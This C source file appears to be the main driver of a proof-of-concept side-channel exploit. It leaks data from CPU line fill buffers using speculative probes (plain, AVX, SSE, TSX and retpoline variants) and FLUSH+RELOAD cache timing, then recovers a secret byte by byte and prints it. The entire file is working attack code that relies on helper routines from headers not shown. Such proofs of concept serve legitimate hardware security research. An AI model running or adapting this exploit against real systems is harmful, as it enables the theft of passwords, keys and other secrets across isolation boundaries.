#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <x86intrin.h>

#include <sys/mman.h>

#include <args.h>
#include <memkit.h>
#include <utils.h>

size_t secret_len;

int main(int argc, char *argv[])
{
	struct hit_count results[256];
	struct args args;
	unsigned char *leak;
	unsigned char *buffer;
	unsigned char *attack;
	size_t i, k, round;
	size_t count;

	if (parse_args(&args, argc, argv) < 2) {
		fprintf(stderr, "usage: %s [<options>] <count>\n", argv[0]);
		return -1;
	}

	secret_len = strtoull(argv[1], NULL, 0);

	/* Allocate the leak buffer. */
	leak = calloc(secret_len, sizeof *leak);

	if (!leak) {
		printf(" [-] unable to allocate the leak buffer\n");
		return -1;
	}

	printf(" [+] allocated the leak buffer\n");

	/* Set up the attack page. */
	if (args.leak_src == LEAK_DEMAND) {
		attack = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

		if (attack == MAP_FAILED) {
			printf(" [-] unable to allocate the attack page\n");
			goto err_free_leak;
		}

		printf(" [+] allocated the attack page\n");

		memset(attack, 0, 4096);
		madvise(attack, 4096, MADV_DONTNEED);
	} else if (args.leak_src == LEAK_NULL) {
#if !defined(TSX) && !defined(RETSPEC)
		fprintf(stderr, "error: not supported\n");
		goto err_free_leak;
#endif
		attack = NULL;
		printf(" [+] using NULL as the attack page\n");
	}

	/* Allocate a buffer for FLUSH + RELOAD. */
	buffer = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	if (buffer == MAP_FAILED) {
		printf(" [-] unable to allocate the FLUSH + RELOAD buffer\n");
		goto err_unmap_attack;
	}

	memset(buffer, 0, 256 * 4096);
	printf(" [+] allocated a buffer for FLUSH + RELOAD\n");

	for (i = 0; i < secret_len; ++i) {
		/* Reset the results. */
		clear_results(results);

		for (round = 0; round < args.rounds; ++round) {
			if (attack) {
				madvise(attack, 4096, MADV_DONTNEED);
			}

			/* Flush the FLUSH + RELOAD buffer. */
			for (k = 0; k < 256; ++k) {
				_mm_clflush(buffer + ((k + 5 * round) % 256) * STRIDE);
			}

			_mm_mfence();

			/* Try to leak from the LFBs. */
#if defined(USE_AVX)
			avx_probe(buffer, attack + i);
#elif defined(USE_SSE)
			sse_probe(buffer, attack + i);
#elif defined(TSX)
			tsx_probe2(buffer, attack + i);
#elif defined(RETSPEC)
			retpol_probe2(buffer, attack + i);
#else
			probe(buffer, attack + i);
#endif

			/* Reconstruct the value by timing the FLUSH + RELOAD buffer. */
			time_buffer(results, buffer, args.threshold);
		}

		/* Find the value that got the most hits. */
		match_best(leak + i, &count, results);
	}

	/* Display the result. */
	print_result(leak, secret_len, attack);

	/* Clean up. */
	munmap(buffer, 256 * 4096);

	if (attack) {
		munmap(attack, 4096);
	}

	free(leak);

	return 0;

err_unmap_attack:
	if (attack) {
		munmap(attack, 4096);
	}
err_free_leak:
	free(leak);
	return -1;
}

